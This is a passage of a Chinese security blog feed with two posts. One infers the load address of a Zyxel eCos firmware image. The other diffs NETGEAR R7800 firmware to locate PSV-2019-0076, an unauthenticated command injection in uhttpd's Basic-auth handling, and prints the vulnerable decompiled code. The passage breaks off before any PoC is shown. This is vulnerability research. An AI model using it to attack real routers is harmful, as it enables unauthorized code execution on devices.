data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYXJtLmNvbS9kb2N1bWVudGF0aW9uL2R1aTA1NTIvYS90aGUtY29ydGV4LW0zLXByb2Nlc3Nvci9leGNlcHRpb24tbW9kZWwvdmVjdG9yLXRhYmxl">ARM Cortex-M3 Vector table<i class="fa fa-external-link-alt"></i></span></p></blockquote><p>在没有对应的芯片文档或<code>SDK</code>手册等资料时，可以尝试从固件本身出发，通过分析固件中的一些特征来推测可能的加载地址。例如，<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk4Mjc2">Magpie<i class="fa fa-external-link-alt"></i></span>通过识别<code>ARM</code>固件中的函数入口表，然后基于函数入口表中的地址去推测可能的加载基址；<span class="exturl" data-url="aHR0cHM6Ly9saW1rb3BpLm1lL2FuYWx5c2luZy1zajQwMDBzLWZpcm13YXJlLw==">limkopi.me<i class="fa fa-external-link-alt"></i></span>通过查找指令中引用的固定地址，成功试出了该<code>eCos</code>固件的加载地址。上述方法的本质都是查找固件中存在的固定地址(绝对地址)，因为即使加载地址不正确，引用的这些固定地址也不会改变。下面尝试通过同样的方法来对<code>Zyxel</code> <code>RGS200-12P</code>设备的固件进行分析。</p><blockquote><p>由于该固件是<code>MIPS</code>架构的，而<code>Magpie</code>的工具是针对<code>ARM</code>架构的，因此并未直接尝试该工具。</p></blockquote><h3 id="eCos固件加载地址分析"><a href="#eCos固件加载地址分析" class="headerlink" title="eCos固件加载地址分析"></a>eCos固件加载地址分析</h3><p>前面使用<code>binwalk</code>工具进行分析时，其输出结果中包含<code>&quot;eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80000200&quot;</code>。通过查看<code>binwalk</code>中<code>ecos</code>对应的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JlRmlybUxhYnMvYmlud2Fsay9ibG9iL21hc3Rlci9zcmMvYmlud2Fsay9tYWdpYy9lY29z">magic<i class="fa fa-external-link-alt"></i></span>，如下，表明<code>binwalk</code>在该固件中匹配到一些模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># eCos kernel exception handlers</span><br><span class="line">#</span><br><span class="line"># mfc0    $k0, Cause       # Cause of last exception</span><br><span class="line"># nop                      # Some versions of eCos omit the nop</span><br><span class="line"># andi    $k0, 0x7F</span><br><span class="line"># li      $k1, 0xXXXXXXXX</span><br><span class="line"># add     $k1, $k0</span><br><span class="line"># lw      $k1, 0($k1)</span><br><span class="line"># jr      $k1</span><br><span class="line"># nop</span><br><span class="line">0       string      \x00\x68\x1A\x40\x00\x00\x00\x00\x7F\x00\x5A\x33    eCos kernel exception handler, architecture: MIPSEL,</span><br><span class="line">&gt;14     leshort     !0x3C1B                                             &#123;invalid&#125;</span><br><span class="line">&gt;18     leshort     !0x277B                                             &#123;invalid&#125;</span><br><span class="line">&gt;12     uleshort    x                                                   exception vector table base address: 0x%.4X</span><br><span class="line">&gt;16     uleshort    x                                                   \b%.4X</span><br></pre></td></tr></table></figure><p>使用<code>IDA</code>工具加载该文件，设置架构为<code>mipsl</code>、加载地址为<code>0x80000000</code>，在最开始处<code>Make Code</code>后，看到了熟悉的<code>eCos kernel exception handler</code>，同时其中包含一个固定地址为<code>0x80000200</code>。由于该固件文件有点大(约<code>10M</code>)，仅靠单个地址去猜测加载地址比较费事：(1) 一次完整的分析比较耗时(大概几分钟)，猜测多个地址的话需要分析好几次；(2) 手动去确认识别出的函数以及字符串交叉引用是否正确也比较麻烦(可能包含成百上千个函数及字符串交叉引用)。因此还需要查找更多的固定地址以及更有规律的地址，来确定加载地址的区间。</p><blockquote><p>由于对<code>eCos</code>系统不了解，刚开始以为加载地址可能在<code>0x80000000~0x80000200</code>之间 :(，后来发现不对。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ROM:80000000  # Segment type: Pure code</span><br><span class="line">ROM:80000000                 .text # ROM</span><br><span class="line">ROM:80000000                 mfc0    $k0, Cause       # Cause of last exception</span><br><span class="line">ROM:80000004                 nop</span><br><span class="line">ROM:80000008                 andi    $k0, 0x7F</span><br><span class="line">ROM:8000000C                 li      $k1, unk_80000200</span><br><span class="line">ROM:80000014                 add     $k1, $k0</span><br><span class="line">ROM:80000018                 lw      $k1, 0($k1)</span><br><span class="line">ROM:8000001C                 jr      $k1</span><br><span class="line">ROM:80000020                 nop</span><br></pre></td></tr></table></figure><p>在<code>Hex View</code>窗口中快速浏览固件时，发现了一些有规律的内容，如下。其中，存在一些连续的内容(以4字节为单位)，其最后2个字节均相同，对应到<code>IDA View</code>窗口中，分别为指向代码片段的地址和指向字符串的地址。由于此时加载地址不正确，故看到的字符串引用比较奇怪。</p><blockquote><p>当然，文件中还存在一些其他的规律，比如以8字节为单位，以16字节为单位等等。</p></blockquote><img data-src="images/hex_addr_pattern.png"><p>根据上述规律可以从固件文件中提取出所有的固定地址，一方面可以缩小加载地址所在的范围，另一方面可以利用这些固定地址去判断尝试的加载地址是否正确。<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk4Mjc2">Magpie<i class="fa fa-external-link-alt"></i></span>根据代码片段地址引用处是否是函数的序言指令来判断加载地址是否正确，由于函数的序言指令需要考虑多种情况，这里采用另一种简单的方式：根据字符串交叉引用是否正确来进行判断。</p><p>针对该<code>eCos</code>固件，确定其加载地址的方法如下：</p><p>(1) 以4字节为单位，判断邻近内容的低/高2字节是否相同，提取固件中所有符合规律的固定地址。考虑到大小端差异，在实际比较时以2字节为单位，判断相邻浅蓝色框(或红色框)内的内容是否相同。</p><img data-src="images/hex_search_pattern.png" style="zoom:70%"><p>(2) 提取出所有的固定地址后，先筛掉不合法的地址，然后对剩下的地址进行排序，排序后的结果中的第一个地址为加载地址的上限。同时，排序后的结果中前半部分为指向代码片段的地址，后半部分为指向字符串的地址。从中选择一个地址，将指向字符串的地址和指向代码的地址分开。之后，随机从字符串地址列表中选取一定数量的地址，作为后续判断的依据。</p><blockquote><p>模糊的正确，只需要保证分到字符串地址列表中的地址均正确即可，因此可以尽量从列表后半部分取，至于是否有字符串引用地址分到了代码片段引用地址列表中不重要。</p></blockquote><p>(3) 在确定的加载地址范围内逐步进行尝试，同时针对每个尝试的加载地址，判断之前选取的每个字符串引用地址指向的字符串是否”正确”，并记录下正确的个数。对应字符串地址”命中”最多的那个加载地址，很有可能就是正确的加载地址。</p><blockquote><p>判断字符串引用地址是否正确，可根据该地址是否指向完整字符串的开头判断，即对应地址处的前一个字节是否为<code>&#39;\x00&#39;</code>。当然，也存在一些字符串引用地址指向某个完整字符串的中间(“字符串复用”)，但大部分的地址还是指向完整字符串的开头。</p></blockquote><p>根据上述思路，推测出了该<code>eCos</code>固件的加载地址为<code>0x80040000</code>。通过分析部分函数逻辑和字符串交叉引用，验证该加载地址是正确的。另外，采用该方法对另外几个<code>eCos</code>固件(包括其他厂商的)进行分析，也可以得出正确的加载地址，说明该方法是可行的。当然，该方法还存在可以改进或优化的地方，不过目前暂时够用了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python find_ecos_load_addr.py</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span></span><br><span class="line">[+] Top 10 string hit count ...</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80040000, str_hit_count: 19</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80019a30, str_hit_count: 11</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x800225a0, str_hit_count: 11</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80041cd0, str_hit_count: 11</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x800442d0, str_hit_count: 11</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80019680, str_hit_count: 10</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80019940, str_hit_count: 10</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80019af0, str_hit_count: 10</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80026090, str_hit_count: 10</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> load_base: 0x80008b90, str_hit_count: 9</span></span><br><span class="line">[+] Possible load_base: 0x80040000</span><br></pre></td></tr></table></figure><h3 id="binwalk-magic添加"><a href="#binwalk-magic添加" class="headerlink" title="binwalk magic添加"></a>binwalk magic添加</h3><p>设置正确的加载地址后，在对文件进行分析时，在文件头部发现与<code>VSR table</code>初始化相关的代码，如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:80040118                 li      $gp, 0x809A1140</span><br><span class="line">.text:80040120                 li      $a0, 0x8099B7D0</span><br><span class="line">.text:80040128                 move    $sp, $a0</span><br><span class="line">.text:8004012C                 li      $v0, loc_80040224</span><br><span class="line">.text:80040134                 li      $v1, 0x80000200</span><br><span class="line">.text:8004013C                 sw      $v0, 4($v1)</span><br><span class="line">.text:80040140                 sw      $v0, 8($v1)</span><br><span class="line">.text:80040144                 sw      $v0, 0xC($v1)</span><br><span class="line">.text:80040148                 sw      $v0, 0x10($v1)</span><br><span class="line">.text:8004014C                 sw      $v0, 0x14($v1)</span><br><span class="line">.text:80040150                 sw      $v0, 0x18($v1)</span><br><span class="line">.text:80040154                 sw      $v0, 0x1C($v1)</span><br><span class="line">.text:80040158                 sw      $v0, 0x20($v1)</span><br><span class="line">.text:8004015C                 sw      $v0, 0x24($v1)</span><br><span class="line"># ...</span><br></pre></td></tr></table></figure><p>参考文章<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIwNDA1MDA1L2FydGljbGUvZGV0YWlscy83Nzk3MTkyOQ==">ecos vector.S 分析II<i class="fa fa-external-link-alt"></i></span>中对<code>eCos</code>异常中断的初始化及处理的介绍，对照上述代码可知，<code>0x80000200</code>为<code>hal_vsr_table</code>的地址，而<code>0x80040224</code>则为<code>__default_exception_vsr</code>的地址。根据前面推测出的加载地址<code>0x80040000</code>，猜测该地址与<code>__default_exception_vsr</code>有关，即根据<code>__default_exception_vsr</code>的地址，考虑地址对齐，可以推测出对应的加载地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># mips cpu 产生exception&#x2F;interrupt后，cpu 会跳到特定的几个地址上,</span><br><span class="line"># BEV&#x3D;0时，一般的在0x80000180,当然还有些其他地址，详细的要去看mips书籍</span><br><span class="line"># 这里有这样的代码</span><br><span class="line">FUNC_START(other_vector)</span><br><span class="line">    mfc0    k0,cause        # K0 &#x3D; exception cause</span><br><span class="line">    nop</span><br><span class="line">    andi    k0,k0,0x7F        # isolate exception code</span><br><span class="line">    la      k1,hal_vsr_table    # address of VSR table</span><br><span class="line">    add     k1,k1,k0        # offset of VSR entry</span><br><span class="line">    lw      k1,0(k1)        # k1 &#x3D; pointer to VSR</span><br><span class="line">    jr      k1            # go there</span><br><span class="line">    nop               # (delay slot)</span><br><span class="line">FUNC_END(other_vector)</span><br><span class="line"></span><br><span class="line"># 从cause 里取出exception ExcCode,然后到hal_vsr_table 取相应的处理vsr, hal_vsr_table的内容是由 hal_mon_init 填充的</span><br><span class="line"></span><br><span class="line">.macro  hal_mon_init</span><br><span class="line">la      a0,__default_interrupt_vsr</span><br><span class="line">la      a1,__default_exception_vsr# &lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">la      a3,hal_vsr_table  # &lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">sw      a0,0(a3)</span><br><span class="line">sw      a1,1*4(a3)</span><br><span class="line">sw      a1,2*4(a3)</span><br><span class="line">sw      a1,3*4(a3)</span><br><span class="line">sw      a1,4*4(a3)</span><br><span class="line">sw      a1,5*4(a3)</span><br><span class="line">sw      a1,6*4(a3)</span><br><span class="line">sw      a1,7*4(a3)</span><br><span class="line">    sw      a1,8*4(a3)</span><br><span class="line"># ...</span><br><span class="line">    .endm</span><br><span class="line"># 这里填充的是__default_interrupt_vsr和__default_exception_vsr,</span><br><span class="line"># ExcCode&#x3D;0是interrupt,其他的都是exception,就是说产生interrupt会调用__default_interrupt_vsr，产生exception会调用__default_exception_vsr。</span><br></pre></td></tr></table></figure><p>根据上述代码特征，通过在<code>binwalk</code>中添加对应的<code>eCos magic</code>，再次对文件进行分析时即可匹配对应的代码模式，输出<code>__default_exception_vsr</code>地址信息，如下，根据该信息即可推测出对应的加载地址。</p><blockquote><p>利用<code>binwalk</code>对另外几个<code>eCos</code>固件(包括其他厂商的)进行分析，也可以输出相关的信息，推测出对应的加载地址。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk RGS200-12P.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80000200</span><br><span class="line">128           0x80            eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80000200</span><br><span class="line">300           0x12C           eCos vector table initialization handler, architecture: MIPSEL, default exception vector table base address: 0x80040224, hal_vsr_table base address: 0x80000200</span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span></span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="自动分析"><a href="#自动分析" class="headerlink" title="自动分析"></a>自动分析</h4><p>使用<code>IDA</code>加载该固件并设置正确的架构、加载地址等参数后，默认情况下<code>IDA</code>不会自动进行分析。相比而言，<code>Ghidra</code>则可以自动进行分析，成功识别出函数并建立字符串的交叉引用。因此，一种方式是对照<code>Ghidra</code>分析的结果，在<code>IDA</code>中进行部分手动<code>Make Code</code> (当然，也可以直接使用<code>Ghidra</code> … )；另一种方式是写一个简单的<code>eCos loader</code>插件，然后<code>IDA</code>就可以自动进行分析了。</p><h4 id="函数名恢复"><a href="#函数名恢复" class="headerlink" title="函数名恢复"></a>函数名恢复</h4><p>该单一大文件中不存在导入表及导出表，故无法区分哪些是常见的系统函数，比如<code>memcpy()</code>, <code>strcpy()</code>等。但也有其好处，在代码中存在很多函数名/日志等信息，根据这些信息可以很容易地对函数名进行恢复。</p><img data-src="images/function_name_recover_sample.png" style="zoom:80%"><h4 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h4><p>对于<code>MIPS32</code>架构的程序，常见的函数调用约定遵循<code>O32 ABI</code>，即<code>$a0-$a3</code>寄存器用于函数参数传递，多余的参数通过栈进行传递，返回值保存在<code>$v0-$v1</code>寄存器中。而该<code>eCos</code>固件则遵循<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTUlQU19hcmNoaXRlY3R1cmUjQ2FsbGluZ19jb252ZW50aW9ucw==">N32 ABI<i class="fa fa-external-link-alt"></i></span>，最大的不同在于<code>$a0-$a7</code>寄存器用于函数参数传递(对应<code>O32 ABI</code>中的<code>$a0-$a3</code>, <code>$t0-$t3</code>)。</p><img data-src="images/mips_n32_call_convention_sample.png" style="zoom:80%"><p><code>IDA</code>中支持更改处理器选项中的<code>ABI</code>模式，但仅修改该参数似乎不起作用。默认情况下<code>&quot;Compiler&quot;</code>是<code>&quot;Unknown&quot;</code>，将其修改为<code>&quot;GNU C++&quot;</code>，同时修改<code>ABI</code>为<code>n32</code>，之后反编译代码中函数参数的显示就正常了。</p><img data-src="images/ida_processor_compiler_option.png" style="zoom:60%"><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文通过对<code>Zyxel</code>某设备<code>eCos</code>固件进行分析，寻找固件中引用的固定地址，给出了推测固件加载地址的思路，根据该思路成功得到了固件的加载地址。同时，通过对文件进行分析，在文件中发现了与<code>VSR table</code>初始化相关的代码，根据该代码可以反推出固件的加载地址，并在<code>binwalk</code>中添加对应的<code>eCos magic</code>来自动匹配该模式。</p><blockquote><p>脚本见 <span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vY3E2NzQzNTA1MjkvNzRlNWI2ZDMxNzgwODgyYzU0YzgwMzAyMTcyYWQ3NTM=">find_ecos_load_addr.py<i class="fa fa-external-link-alt"></i></span></p></blockquote><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIwNDA1MDA1L2FydGljbGUvZGV0YWlscy83Nzk3MTkyOQ==">ecos vector.S 分析II: exception/interrupt<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjNvci5kZS9zdGFydGluZy1lbWJlZGRlZC1yZXZlcnNlLWVuZ2luZWVyaW5nLWZyZWVydG9zLWxpYm9wZW5jbTMtb24tc3RtMzJmMTAzYzh0Ni5odG1s">Starting Embedded Reverse Engineering: FreeRTOS, libopencm3 on STM32F103C8T6<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk4Mjc2">Magpie: ARM固件基址定位工具开发<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9saW1rb3BpLm1lL2FuYWx5c2luZy1zajQwMDBzLWZpcm13YXJlLw==">limkopi.me: Analysing SJ4000’s firmware<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTUlQU19hcmNoaXRlY3R1cmUjQ2FsbGluZ19jb252ZW50aW9ucw==">MIPS calling conventions<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjMzMzYx">https://www.anquanke.com/post/id/233361<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 固件 </tag>
            
            <tag> eCos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NETGEAR PSV-2019-0076: 从漏洞公告到PoC</title>
      <link href="2020/10/01/NETGEAR-PSV-2019-0076-%E4%BB%8E%E6%BC%8F%E6%B4%9E%E5%85%AC%E5%91%8A%E5%88%B0PoC/"/>
      <url>2020/10/01/NETGEAR-PSV-2019-0076-%E4%BB%8E%E6%BC%8F%E6%B4%9E%E5%85%AC%E5%91%8A%E5%88%B0PoC/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看到一篇<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eWFmZmFpcnMuY28vd29yZHByZXNzLzk5MTc3L3NlY3VyaXR5L25ldGdlYXItZmxhZ3NoaXAtbmlnaHRoYXdrLXJvdXRlci1yY2UuaHRtbA==">安全资讯<i class="fa fa-external-link-alt"></i></span>，提到<code>Netgear</code>修复了其产品中的多个高危漏洞，包括<code>PSV-2019-0076</code>、<code>PSV-2018-0352</code>和<code> PSV-2019-0051</code>等。其中，利用部分漏洞可实现远程代码执行，且无需认证。以<code>PSV-2019-0076</code>为例，查看<code>Netgear</code>的安全公告，如下，并没有透露过多的细节。</p><a id="more"></a><img data-src="images/netgear_psv_2019_0076.png" style="zoom:90%"><p>通常来说，<code>IoT</code>设备上的漏洞相对比较简单，于是打算花点时间看下，尝试通过补丁比对定位具体的漏洞，进一步地得到对应的<code>PoC</code>。</p><blockquote><p>本文写于3月。</p></blockquote><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>由公告可知，该漏洞在<code>1.0.2.68</code>版本中修复，下载邻近的两个版本<code>1.0.2.62</code>和<code>1.0.2.68</code>的固件到本地进行分析。通过对两个文件系统进行简单比对，发现这2个版本之间的差异非常多。通常来说，不同版本之间的差异越小，越有助于定位漏洞。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> diff -r _R7800-V1.0.2.62.img.extracted/squashfs-root/ _R7800-V1.0.2.68.img.extracted/squashfs-root/ | grep Binary | wc -l</span></span><br><span class="line">335</span><br></pre></td></tr></table></figure><blockquote><p>从更新时间来看，这两个版本之间间隔差不多有11个月。</p></blockquote><p>在对文件系统进行简单分析后，将比对的目录缩小在<code>/www</code>和<code>/usr/sbin</code>两个目录中。浏览了下<code>diff</code>的结果，其中有几个文件比较有意思，包括<code>proccgi</code>和<code>uhttpd</code>等。</p><p>先对<code>proccgi</code>进行分析，借助<code>Bindiff</code>插件进行比对，如下。在函数<code>sub_00008824()</code>中，仅改变了处理流程的顺序，未发现安全问题。</p><img data-src="images/proccgi_matched_functions.png" style="zoom:70%"><p>同样，对<code>uhttpd</code>进行分析，<code>Bindiff</code>比对的结果如下。大部分发生变化的是系统函数，除了<code>uh_cgi_auth_check()</code>函数之外。</p><img data-src="images/uhtpd_matched_functions.png" style="zoom:70%"><p>两个版本中<code>uh_cgi_auth_check()</code>函数内的主要差异如下。在新版本中增加了<code>dni_system()</code>函数，而在老版本中则使用<code>snprintf() + system()</code>的模式，熟悉的人一看可能就知道这是典型的命令注入漏洞。在查看<code>dni_system()</code>后，其内部使用<code>execve()</code>来执行命令，更加证实了这一点。</p><img data-src="images/uh_cgi_auth_check_diff.png" style="zoom:80%"><p>现在大体上定位到了漏洞的具体位置(当然也有可能不是…)，还需要进一步分析看能否触发以及如何触发。</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p><code>uh_cgi_auth_check()</code>函数的部分伪代码如下，其主要逻辑为：找到请求头中的<code>Authorization</code>部分，获取<code>&quot;Basic  &quot;</code>后面的内容，在<code>base64</code>解码后获取其中的<code>password</code>，再传入<code>snprintf()</code>中进行格式化，最后调用<code>system()</code>执行。典型的命令注入模式，且发生在进行认证的过程中，与安全资讯中提到的的”无需认证”相对应，再一次说明漏洞很可能就是这里(当然还没有完全确定…)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">uh_cgi_auth_check</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )  <span class="comment">// 从HTTP头中找到Authorization部分, 然后获取&quot;Basic &quot;后面的值</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(v10 + <span class="number">16</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, <span class="string">&quot;Authorization&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(v10 + <span class="number">20</span>);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(v10 + <span class="number">20</span>)) &gt; <span class="number">6</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = strncasecmp(v12, <span class="string">&quot;Basic &quot;</span>, <span class="number">6u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v13 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  uh_b64decode(&amp;s, <span class="number">4095</span>, v12 + <span class="number">6</span>, v23 - <span class="number">6</span>);</span><br><span class="line">  v24 = <span class="built_in">strchr</span>(&amp;s, <span class="string">&#x27;:&#x27;</span>);  <span class="comment">// base64解码后的内容为&quot;username:password&quot;这种形式</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  *v24 = v14;</span><br><span class="line">  v15 = (<span class="keyword">int</span>)(v24 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v24 != (<span class="keyword">char</span> *)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 将password作为参数传入, 然后调用system()执行</span></span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)&amp;v29, <span class="number">0x80</span>u, <span class="string">&quot;/usr/sbin/hash-data -e %s &gt;/tmp/hash_result&quot;</span>, v15);</span><br><span class="line">    system((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v29);</span><br><span class="line">    v3 = cat_file((<span class="keyword">int</span>)<span class="string">&quot;/tmp/hash_result&quot;</span>, v25, v26);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果手边有真实设备的话，其实就可以直接在设备上进行测试了，然而我手边并没有真实设备:( …  所以继续对调用路径进行分析。<code>uh_cgi_auth_check()</code>函数的调用路径很简单，仅有2处调用，且均在<code>main()</code>函数中，如下。对<code>main()</code>函数前面的逻辑进行了简单的分析，主要是解析<code>uhttpd</code>命令行参数、服务初始化、解析部分HTTP请求参数之类的，没啥特别的。</p><img data-src="images/uh_cgi_auth_check_call.png" style="zoom:90%"><p>现在确信这里是可以触发的，奈何手边没有真实设备，于是又开始折腾固件仿真，想进一步通过动态测试验证。</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>对<code>IoT</code>设备进行固件仿真，常见的方式如下。</p><ul><li>基于<code>qemu user mode</code>，模拟单个服务:  <code>D-Link</code>的很多设备可以采用这种方式</li><li>基于<code>qemu system mode</code>， 模拟整个系统：一些第三方工具对<code>qemu</code>进行了封装，比如<code>Firmadyne</code>、<code>ARM-X</code></li><li>“纯软件模拟”：如<code>Qiling</code></li></ul><p>为了方便，首先使用<code>Firmadyne</code>框架进行测试，发现无法获取网络配置信息。而<code>ARM-X</code>和<code>Qiling</code>框架暂时未仔细研究，所以还是采用我经常使用的方式：基于<code>qemu user mode</code>模拟单个服务，如下。幸运地是，服务成功跑起来了，暂时没有报错，无需手动修复环境。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 